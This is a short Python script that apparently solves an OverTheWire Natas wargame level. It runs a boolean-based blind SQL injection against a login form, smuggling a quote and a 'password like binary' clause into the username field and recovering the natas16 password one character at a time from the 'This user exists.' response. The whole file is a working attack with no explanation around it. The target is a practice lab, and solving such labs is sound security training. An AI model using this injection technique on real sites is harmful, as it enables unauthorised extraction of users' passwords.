import config
import os, re, string
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

allchars = string.ascii_uppercase + string.ascii_lowercase + string.digits
guessed = ""

while True:
	for c in allchars:
		guess = guessed + c
		response = post(url, auth=(user, password), params={"debug":1}, data={"username" : "natas16\" and password like binary \"%s%%" % guess})
		if "This user exists." in response.content:
			guessed += c
			break
	response = post(url, auth=(user, password), data={"username" : "natas16\" and password like binary \"%s" % guess})
	if "This user exists." in response.content:
			break

print(guessed)
